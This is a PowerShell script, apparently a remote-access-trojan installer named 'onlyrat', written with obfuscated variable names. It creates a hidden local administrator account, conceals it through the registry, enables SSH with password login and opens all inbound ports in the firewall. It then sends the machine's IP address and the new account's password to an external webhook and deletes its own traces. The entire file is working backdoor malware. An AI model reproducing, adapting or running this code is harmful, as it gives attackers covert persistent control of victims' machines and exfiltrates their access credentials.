function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )    
    begin {
    }    
    process {
        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Verbose "$sqbXFdLvyw local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
    }    
    end {
    }
}

# make admin
$sqbXFdLvyw = "onlyrat"
$DCilJFugpP = RpLGWiUsIy
Remove-LocalUser -Name $sqbXFdLvyw
$HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes

# registry
$csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$jmQikqoKMZ = '00000000'
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force
# =============== SSH SECTION - ALTERNATIVE METHOD ===============
# Check if SSH is already installed
$sshInstalled = Get-WindowsCapability -Online | Where-Object {$_.Name -like "*OpenSSH.Server*"}

if (-not $sshInstalled -or $sshInstalled.State -ne "Installed") {
    Write-Host "[*] Installing OpenSSH Server..." -ForegroundColor Yellow
    
    # METHOD 1: Try Windows Capability (might fail on Home edition)
    try {
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop
        Write-Host "[+] OpenSSH installed via Windows Capability" -ForegroundColor Green
    } catch {
        Write-Host "[!] Windows Capability failed, trying manual install..." -ForegroundColor Red
        
        # METHOD 2: Manual installation from GitHub
        $url = "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.5.0.0p1-Beta/OpenSSH-Win64.zip"
        $zipPath = "$env:TEMP\OpenSSH-Win64.zip"
        $installPath = "C:\Program Files\OpenSSH"
        
        # Download and extract OpenSSH
        Invoke-WebRequest -Uri $url -OutFile $zipPath
        Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
        
        # Install SSH
        Set-Location "$installPath"
        .\install-sshd.ps1
        
        Remove-Item $zipPath -Force
        Write-Host "[+] OpenSSH installed manually from GitHub" -ForegroundColor Green
    }
}

# Configure and start SSH service
try {
    # Start SSH service
    Start-Service sshd -ErrorAction Stop
    Set-Service -Name sshd -StartupType 'Automatic'
    
    # Configure SSH to allow password authentication
    $sshdConfig = "C:\ProgramData\ssh\sshd_config"
    if (Test-Path $sshdConfig) {
        (Get-Content $sshdConfig) -replace '#PasswordAuthentication yes', 'PasswordAuthentication yes' | Set-Content $sshdConfig
        (Get-Content $sshdConfig) -replace 'PasswordAuthentication no', 'PasswordAuthentication yes' | Set-Content $sshdConfig
    }
    
    # FIREWALL RULES
    Remove-NetFirewallRule -Name "SSH-Allow-All" -ErrorAction SilentlyContinue
    
    New-NetFirewallRule -Name "SSH-Allow-All" `
      -DisplayName "SSH Allow All Inbound" `
      -Enabled True `
      -Direction Inbound `
      -Protocol TCP `
      -LocalPort any `
      -RemoteAddress Any `
      -Profile Any `
      -Action Allow
    
    # Restart SSH service
    Restart-Service sshd -Force
    
    # Test SSH locally
    Start-Sleep -Seconds 3
    Write-Host "[*] Testing SSH service..." -ForegroundColor Yellow
    $testResult = Test-NetConnection -ComputerName localhost -Port 22 -WarningAction SilentlyContinue
    if ($testResult.TcpTestSucceeded) {
        Write-Host "[+] SSH is running on port 22" -ForegroundColor Green
    } else {
        Write-Host "[!] SSH test failed. Manual check required." -ForegroundColor Red
    }
    
} catch {
    Write-Host "[!] SSH configuration failed: $_" -ForegroundColor Red
    Write-Host "[!] Manual SSH setup required on target." -ForegroundColor Red
}
# =============== END SSH SECTION ===============

# rat file
$CRYnrkaDbe = "$env:UserName.rat"
$AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

New-Item -Path $CRYnrkaDbe -Force
Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ -Force # local ip addr
Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP -Force # pass
Add-Content -Path $CRYnrkaDbe -Value $env:temp -Force # temp
Add-Content -Path $CRYnrkaDbe -Value $pwd -Force # startup
Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote host
Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # SSH PORT - MUST BE 22 FOR LOCAL CONNECTIONS
Add-Content -Path $CRYnrkaDbe -Value 'local' -Force # connection type

# send file to webhook
$PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $PEBgxuJUfd"

# cleanup
attrib +h +s +r C:/Users/onlyrat 
Remove-Item $CRYnrkaDbe -Force
Remove-Item lawFvVTikZ.txt -Force
Remove-Item KFPGaEYdcz.ps1 -Force

# Optional: Display success message
Write-Host "[+] SSH Server installed and configured on port 22" -ForegroundColor Green
Write-Host "[+] Firewall rules added for all network profiles" -ForegroundColor Green
Write-Host "[+] .rat configuration file sent to webhook" -ForegroundColor Green
